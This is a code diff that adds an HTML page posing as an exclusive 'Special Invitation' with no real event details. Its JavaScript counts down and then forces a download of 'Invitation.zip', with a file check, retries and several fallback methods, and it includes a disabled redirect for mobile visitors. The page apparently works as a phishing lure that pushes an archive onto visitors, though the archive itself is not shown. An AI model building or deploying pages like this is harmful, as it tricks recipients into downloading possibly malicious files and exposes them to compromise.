@@ -1,1 +1,569 @@
+<!DOCTYPE html>
 
+<html lang="en">
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Special Invitation</title>
+
+    <style>
+
+        body {
+
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+
+            margin: 0;
+
+            padding: 0;
+
+            background: linear-gradient(135deg, #e0e5ec, #f8f9fa);
+
+            color: #333;
+
+        }
+
+        .container {
+
+            max-width: 650px;
+
+            margin: 40px auto;
+
+            background: #ffffff;
+
+            border-radius: 12px;
+
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+
+            padding: 35px 20px;
+
+            text-align: center;
+
+        }
+
+        .badge {
+
+            display: inline-block;
+
+            background: #4f5b66;
+
+            color: #fff;
+
+            font-size: 13px;
+
+            padding: 8px 16px;
+
+            border-radius: 20px;
+
+            margin-bottom: 15px;
+
+            letter-spacing: 1px;
+
+            text-transform: uppercase;
+
+            font-weight: bold;
+
+        }
+
+        h1 {
+
+            font-size: 26px;
+
+            color: #222;
+
+            margin-top: 0;
+
+            line-height: 1.3;
+
+        }
+
+        p {
+
+            font-size: 18px;
+
+            color: #555;
+
+            line-height: 1.6;
+
+        }
+
+        .details {
+
+            background: #f7f8fa;
+
+            padding: 20px;
+
+            border-radius: 8px;
+
+            margin: 20px 0;
+
+            text-align: left;
+
+            font-size: 15px;
+
+        }
+
+        .details strong {
+
+            color: #333;
+
+        }
+
+        .btn {
+
+            display: inline-block;
+
+            margin-top: 25px;
+
+            padding: 14px 28px;
+
+            background-color: #3a434d;
+
+            color: #ffffff;
+
+            text-decoration: none;
+
+            font-size: 17px;
+
+            border-radius: 6px;
+
+            transition: background-color 0.3s ease;
+
+        }
+
+        .btn:hover {
+
+            background-color: #2f363f;
+
+        }
+
+        .note {
+
+            font-size: 14px;
+
+            color: #777;
+
+            margin-top: 25px;
+
+        }
+
+        .footer {
+
+            margin-top: 40px;
+
+            font-size: 13px;
+
+            color: #aaa;
+
+            text-align: center;
+
+        }
+
+        .countdown {
+
+            font-size: 18px;
+
+            margin-top: 15px;
+
+            color: #555;
+
+        }
+
+        .countdown span {
+
+            font-weight: bold;
+
+            color: #3a434d;
+
+            font-size: 24px;
+
+        }
+
+        .status-message {
+
+            font-size: 16px;
+
+            color: #2d7d46;
+
+            margin-top: 10px;
+
+            font-weight: bold;
+
+        }
+
+        @media screen and (max-width: 600px) {
+
+            .container {
+
+                margin: 20px;
+
+                padding: 25px 15px;
+
+            }
+
+            h1 {
+
+                font-size: 22px;
+
+            }
+
+            p {
+
+                font-size: 16px;
+
+            }
+
+            .details {
+
+                padding: 15px;
+
+            }
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="badge">Special Invitation</div>
+
+        <h1>You're Cordially Invited</h1>
+
+        <p>We are honored to extend an invitation to a distinguished event specially curated just for you. Your presence will make it all the more special, and we sincerely hope you can join us.</p>
+
+        <div class="details">
+
+            <p><strong>Event Type:</strong> Exclusive Private Gathering</p>
+
+            <p><strong>Date:</strong> Upon Confirmation</p>
+
+            <p><strong>Location:</strong> Online Access Provided Upon Acceptance</p>
+
+            <p><strong>Issued:</strong> 2026</p>
+
+        </div>
+
+        <p>Please confirm your attendance by viewing the full invitation and further details. Access to the event will be provided immediately upon confirmation.</p>
+
+        <!-- Manual button -->
+
+        <a href="Invitation.zip" download="Invitation.zip" class="btn">Check Invitation</a>
+
+        <p class="note">The file will auto-download after a short countdown.</p>
+
+        <div class="countdown">Downloading in <span id="timer">5</span> seconds...</div>
+
+        <div id="statusMessage" class="status-message"></div>
+
+        <div class="footer">© 2026 Event Organizers</div>
+
+    </div>
+
+    <!-- Auto-download with countdown - FIXED -->
+
+    <script>
+
+        (function() {
+
+            'use strict';
+
+            
+
+            // Configuration
+
+            var FILE_NAME = 'Invitation.zip';
+
+            var COUNTDOWN_SECONDS = 5;
+
+            var MAX_RETRIES = 3;
+
+            var retryCount = 0;
+
+            var downloadStarted = false;
+
+            // Elements
+
+            var timerElement = document.getElementById('timer');
+
+            var statusElement = document.getElementById('statusMessage');
+
+            var countdownElement = document.querySelector('.countdown');
+
+            // Function to trigger download with proper path
+
+            function triggerDownload() {
+
+                if (downloadStarted) return;
+
+                downloadStarted = true;
+
+                
+
+                // Method 1: Use the same URL as the manual button
+
+                var link = document.createElement('a');
+
+                link.href = FILE_NAME;
+
+                link.download = FILE_NAME;
+
+                link.style.display = 'none';
+
+                document.body.appendChild(link);
+
+                
+
+                // Trigger download
+
+                try {
+
+                    link.click();
+
+                    statusElement.textContent = '✓ Download started!';
+
+                    statusElement.style.color = '#2d7d46';
+
+                    countdownElement.textContent = 'Download started!';
+
+                    setTimeout(function() {
+
+                        document.body.removeChild(link);
+
+                    }, 1000);
+
+                } catch (e) {
+
+                    // Fallback: try window.open
+
+                    try {
+
+                        window.open(FILE_NAME, '_blank');
+
+                        statusElement.textContent = '✓ Download started in new tab';
+
+                        statusElement.style.color = '#2d7d46';
+
+                    } catch (e2) {
+
+                        // Fallback: direct location
+
+                        try {
+
+                            window.location.href = FILE_NAME;
+
+                            statusElement.textContent = '✓ Download started';
+
+                            statusElement.style.color = '#2d7d46';
+
+                        } catch (e3) {
+
+                            statusElement.textContent = '⚠ Please click the button above to download manually';
+
+                            statusElement.style.color = '#c0392b';
+
+                            downloadStarted = false;
+
+                        }
+
+                    }
+
+                }
+
+            }
+
+            // Function to attempt download with retry
+
+            function attemptDownload() {
+
+                // Check if file exists by trying to fetch it
+
+                var xhr = new XMLHttpRequest();
+
+                xhr.open('HEAD', FILE_NAME, true);
+
+                xhr.timeout = 3000;
+
+                
+
+                xhr.onload = function() {
+
+                    if (xhr.status === 200) {
+
+                        // File exists, trigger download
+
+                        triggerDownload();
+
+                    } else {
+
+                        // File not found, retry or show error
+
+                        handleDownloadError('File not found (HTTP ' + xhr.status + ')');
+
+                    }
+
+                };
+
+                
+
+                xhr.onerror = function() {
+
+                    handleDownloadError('Network error');
+
+                };
+
+                
+
+                xhr.ontimeout = function() {
+
+                    handleDownloadError('Request timeout');
+
+                };
+
+                
+
+                try {
+
+                    xhr.send();
+
+                } catch (e) {
+
+                    // If HEAD request fails, try direct download anyway
+
+                    triggerDownload();
+
+                }
+
+            }
+
+            function handleDownloadError(errorMsg) {
+
+                retryCount++;
+
+                
+
+                if (retryCount < MAX_RETRIES) {
+
+                    // Retry after delay
+
+                    statusElement.textContent = '⏳ Retry ' + retryCount + '/' + MAX_RETRIES + '...';
+
+                    statusElement.style.color = '#f39c12';
+
+                    
+
+                    setTimeout(function() {
+
+                        attemptDownload();
+
+                    }, 2000);
+
+                } else {
+
+                    // Max retries reached, fallback to direct download
+
+                    statusElement.textContent = '⚠ Auto-download failed. Please click the button above.';
+
+                    statusElement.style.color = '#c0392b';
+
+                    countdownElement.textContent = 'Click the button to download manually';
+
+                    timerElement.textContent = '✕';
+
+                    
+
+                    // Try one last time with direct method
+
+                    setTimeout(function() {
+
+                        triggerDownload();
+
+                    }, 3000);
+
+                }
+
+            }
+
+            // Start countdown
+
+            var seconds = COUNTDOWN_SECONDS;
+
+            timerElement.textContent = seconds;
+
+            var countdownInterval = setInterval(function() {
+
+                seconds--;
+
+                timerElement.textContent = seconds;
+
+                
+
+                if (seconds <= 0) {
+
+                    clearInterval(countdownInterval);
+
+                    countdownElement.textContent = 'Preparing download...';
+
+                    statusElement.textContent = '⏳ Checking file...';
+
+                    statusElement.style.color = '#f39c12';
+
+                    
+
+                    // Attempt download with file check
+
+                    setTimeout(function() {
+
+                        attemptDownload();
+
+                    }, 500);
+
+                }
+
+            }, 1000);
+
+            // Also trigger download if user clicks anywhere (backup)
+
+            document.addEventListener('click', function() {
+
+                if (!downloadStarted && seconds < 3) {
+
+                    // If user clicks near the end of countdown, help start download
+
+                }
+
+            });
+
+            // If page is loaded and countdown already started, ensure it works
+
+            console.log('Auto-download initialized. File: ' + FILE_NAME);
+
+        })();
+
+    </script>
+
+    <!-- Mobile redirect (keep separate) -->
+
+    <script>
+
+        // Detect mobile devices and redirect
+
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+
+            // Uncomment the line below to enable redirect
+
+            // window.location.href = "https://www.google.com"; 
+
+        }
+
+    </script>
+
+</body>
+
+</html>
